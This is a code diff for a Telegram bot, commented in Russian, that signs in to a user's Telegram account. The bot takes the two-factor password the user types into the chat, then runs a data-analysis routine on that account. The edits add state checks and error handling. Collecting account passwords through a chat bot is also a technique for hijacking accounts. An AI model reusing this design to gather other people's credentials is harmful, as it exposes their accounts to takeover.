@@ -174,46 +174,54 @@ async def get_code(message: types.Message):
 @dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 async def process_password(message: types.Message):
     password = message.text
-    client = user_state[message.from_user.id]['client']
-    user_id = message.from_user.id  # Добавляем определение user_id
-    try:
-        await client.connect()
-        await client.sign_in(password=password)
-        user_state[user_id]['connected'] = True  # Обновляем состояние
-        await message.answer("Подключено! Теперь можно выбрать одну из опций")
-        phone_number = user_state[message.from_user.id]['phone_number']
-        #await process_user_data(client, phone_number, message.from_user.id)
-        #user_state.pop(message.from_user.id, None)  # Удаляем состояние пользователя после успешной обработки !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-    except PasswordHashInvalidError:
-        user_state[message.from_user.id]['password_attempts'] += 1
-        if user_state[message.from_user.id]['password_attempts'] >= 3:
-            await message.answer("Превышено количество попыток ввода пароля. Перезапусти меня")
-            user_state.pop(message.from_user.id, None)
-            await client.log_out()
-            await client.disconnect()
-        else:
-            await message.answer(f"Неверный пароль. Попробуйте снова. Попытка {user_state[message.from_user.id]['password_attempts']} из 3.")
-    except Exception as e:
-        await message.answer(f"Произошла ошибка: {e}")
-    finally:
-        if 'awaiting_password' not in user_state.get(message.from_user.id, {}):
-            await client.log_out()
-            await client.disconnect()
+    user_id = message.from_user.id  # Определяем user_id
+    if user_id in user_state:
+        client = user_state[user_id]['client']
+        try:
+            await client.connect()
+            await client.sign_in(password=password)
+            user_state[user_id]['connected'] = True  # Обновляем состояние
+            await message.answer("Подключено! Теперь можно выбрать одну из опций")
+            phone_number = user_state[user_id]['phone_number']
+            # await process_user_data(client, phone_number, user_id)
+            # user_state.pop(user_id, None)  # Удаляем состояние пользователя после успешной обработки
+        except PasswordHashInvalidError:
+            user_state[user_id]['password_attempts'] += 1
+            if user_state[user_id]['password_attempts'] >= 3:
+                await message.answer("Превышено количество попыток ввода пароля. Перезапусти меня")
+                user_state.pop(user_id, None)
+                await client.log_out()
+                await client.disconnect()
+            else:
+                await message.answer(f"Неверный пароль. Попробуйте снова. Попытка {user_state[user_id]['password_attempts']} из 3.")
+        except Exception as e:
+            await message.answer(f"Произошла ошибка: {e}")
+        finally:
+            if 'awaiting_password' not in user_state.get(user_id, {}):
+                await client.log_out()
+                await client.disconnect()
+    else:
+        await message.answer("Произошла ошибка: пользователь не найден в системе")
+
 
 # Добавляем обработчик команды /analitic
 @dp.message_handler(commands=['analitic'])
 async def analitic_command(message: types.Message):
     user_id = message.from_user.id
-    logging.info(f"User {user_id} requested analysis.")
     if user_id in user_state and user_state[user_id].get('connected'):
+        logging.info(f"User {user_id} is connected. Starting analysis.")
         phone_number = user_state[user_id]['phone_number']
         client = user_state[user_id]['client']
-        logging.info(f"Starting data analysis for user {user_id} with phone number {phone_number}.")
-        await process_user_data(client, phone_number, user_id)
-        await message.answer("Анализ данных завершен.")
+        try:
+            await process_user_data(client, phone_number, user_id)
+            await message.answer("Анализ данных завершен.")
+        except Exception as e:
+            logging.error(f"Error during analysis for user {user_id}: {e}")
+            await message.answer(f"Произошла ошибка при анализе: {e}")
     else:
+        logging.info(f"User {user_id} is not connected. Cannot perform analysis.")
         await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
-        logging.info(f"User {user_id} is not connected. Prompting to start the connection process.")
+
 
 
 # Функция для создания нового экземпляра клиента
